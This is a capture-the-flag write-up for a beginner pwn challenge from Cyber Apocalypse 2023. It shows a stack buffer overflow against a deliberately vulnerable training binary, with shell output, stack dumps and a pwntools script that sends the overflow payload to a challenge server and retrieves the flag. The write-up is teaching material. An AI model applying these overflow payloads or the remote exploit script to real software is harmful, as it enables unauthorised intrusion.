# Getting Started

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319132022.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/Pwn/Getting-Started/pwn_getting_started.zip):**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Pwn/Getting-Started)-[2023.03.19|13:20:52(HKT)]
└> file pwn_getting_started.zip 
pwn_getting_started.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Pwn/Getting-Started)-[2023.03.19|13:20:57(HKT)]
└> unzip pwn_getting_started.zip 
Archive:  pwn_getting_started.zip
   creating: challenge/
   creating: challenge/glibc/
  inflating: challenge/glibc/ld-linux-x86-64.so.2  
  inflating: challenge/glibc/libc.so.6  
  inflating: challenge/wrapper.py    
 extracting: challenge/flag.txt      
  inflating: challenge/gs
```

```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Pwn/Getting-Started)-[2023.03.19|13:21:07(HKT)]
└> cd challenge      
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Pwn/Getting-Started/challenge)-[2023.03.19|13:21:11(HKT)]
└> file *                      
flag.txt:   ASCII text
glibc:      directory
gs:         ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=505eb225ba13a677aa5f00d5e3d840f63237871f, for GNU/Linux 3.2.0, not stripped
wrapper.py: Python script, ASCII text executable
```

In here, we see `glibc` directory, which stores necessary libc files for the `gs` binary.

**Then, the `wrapper.py` is the exploit Python script:**
```py
#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '0.0.0.0' # Change this
PORT = 1337      # Change this

r    = remote(IP, PORT)

# Craft payload
payload = b'A' * 10 # Change the number of "A"s

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

**The `gs` binary is a 64-bit ELF executable, it's dynamically linked and not stripped:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Pwn/Getting-Started/challenge)-[2023.03.19|13:23:00(HKT)]
└> file gs 
gs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=505eb225ba13a677aa5f00d5e3d840f63237871f, for GNU/Linux 3.2.0, not stripped
```

**We can try to run it:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Pwn/Getting-Started/challenge)-[2023.03.19|13:23:43(HKT)]
└> ./gs


Stack frame layout 

|      .      | <- Higher addresses
|      .      |
|_____________|
|             | <- 64 bytes
| Return addr |
|_____________|
|             | <- 56 bytes
|     RBP     |
|_____________|
|             | <- 48 bytes
|   target    |
|_____________|
|             | <- 40 bytes
|  alignment  |
|_____________|
|             | <- 32 bytes
|  Buffer[31] |
|_____________|
|      .      |
|      .      |
|_____________|
|             |
|  Buffer[0]  |
|_____________| <- Lower addresses


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffc23695110 | 0x0000000000000000 <- Start of buffer
0x00007ffc23695118 | 0x0000000000000000
0x00007ffc23695120 | 0x0000000000000000
0x00007ffc23695128 | 0x0000000000000000
0x00007ffc23695130 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffc23695138 | 0x00000000deadbeef <- Target to change
0x00007ffc23695140 | 0x000056249d10c800 <- Saved rbp
0x00007ffc23695148 | 0x00007fbe50e21c87 <- Saved return address
0x00007ffc23695150 | 0x0000000000000001
0x00007ffc23695158 | 0x00007ffc23695228


After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffc23695110 | 0x0000000041414141 <- Start of buffer
0x00007ffc23695118 | 0x0000000000000000
0x00007ffc23695120 | 0x0000000000000000
0x00007ffc23695128 | 0x0000000000000000
0x00007ffc23695130 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffc23695138 | 0x00000000deadbeef <- Target to change
0x00007ffc23695140 | 0x000056249d10c800 <- Saved rbp
0x00007ffc23695148 | 0x00007fbe50e21c87 <- Saved return address
0x00007ffc23695150 | 0x0000000000000001
0x00007ffc23695158 | 0x00007ffc23695228


After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffc23695110 | 0x4242424241414141 <- Start of buffer
0x00007ffc23695118 | 0x0000000000000000
0x00007ffc23695120 | 0x0000000000000000
0x00007ffc23695128 | 0x0000000000000000
0x00007ffc23695130 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffc23695138 | 0x00000000deadbeef <- Target to change
0x00007ffc23695140 | 0x000056249d10c800 <- Saved rbp
0x00007ffc23695148 | 0x00007fbe50e21c87 <- Saved return address
0x00007ffc23695150 | 0x0000000000000001
0x00007ffc23695158 | 0x00007ffc23695228

◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
◉                                                                                                 ◉
◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉
◉                                                                                                 ◉
◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉

>> 
```

In here, we need to fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.

**To do so, I'll first send 32 bytes of "A":**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Pwn/Getting-Started/challenge)-[2023.03.19|13:30:28(HKT)]
└> python3 -c "print('A' * 32)" | ./gs
[...]
>> 

      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffdb70528e0 | 0x4141414141414141 <- Start of buffer
0x00007ffdb70528e8 | 0x4141414141414141
0x00007ffdb70528f0 | 0x4141414141414141
0x00007ffdb70528f8 | 0x4141414141414141
0x00007ffdb7052900 | 0x6969696969696900 <- Dummy value for alignment
0x00007ffdb7052908 | 0x00000000deadbeef <- Target to change
0x00007ffdb7052910 | 0x00005581662c6800 <- Saved rbp
0x00007ffdb7052918 | 0x00007fb9eca21c87 <- Saved return address
0x00007ffdb7052920 | 0x0000000000000001
0x00007ffdb7052928 | 0x00007ffdb70529f8

 
[-] You failed!
```

As you can see, we've filled 32 bytes of 41 ("A" in hex).

**Next, we need to fill the dummy value:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Pwn/Getting-Started/challenge)-[2023.03.19|13:31:16(HKT)]
└> python3 -c "print('A' * 32 + 'B' * 8)" | ./gs
[...]
>> 

      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffe20b04720 | 0x4141414141414141 <- Start of buffer
0x00007ffe20b04728 | 0x4141414141414141
0x00007ffe20b04730 | 0x4141414141414141
0x00007ffe20b04738 | 0x4141414141414141
0x00007ffe20b04740 | 0x4242424242424242 <- Dummy value for alignment
0x00007ffe20b04748 | 0x00000000deadbe00 <- Target to change
0x00007ffe20b04750 | 0x0000562b5ed58800 <- Saved rbp
0x00007ffe20b04758 | 0x00007f8f37621c87 <- Saved return address
0x00007ffe20b04760 | 0x0000000000000001
0x00007ffe20b04768 | 0x00007ffe20b04838

HTB{f4k3_fl4g_4_t35t1ng}
```

As you can see, we successfully filled the dummy value to 8 42s ("B" in hex), and we got the flag!

**Now, we can modify the `wrapper.py` exploit script to send that payload to the instance machine:**
```py
#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '165.232.108.249' # Change this
PORT = 31475      # Change this

r    = remote(IP, PORT)

# Craft payload
payload = b'A' * 32 + b'B' * 8# Change the number of "A"s

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

**Then run it:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Pwn/Getting-Started/challenge)-[2023.03.19|13:33:28(HKT)]
└> python3 ./wrapper.py
[+] Opening connection to 165.232.108.249 on port 31475: Done
[+] Flag --> HTB{b0f_s33m5_3z_r1ght?}
[*] Closed connection to 165.232.108.249 port 31475
```

We got the flag!

- **Flag: `HTB{b0f_s33m5_3z_r1ght?}`**

## Conclusion

What we've learned:

1. Basic Stack Buffer Overflow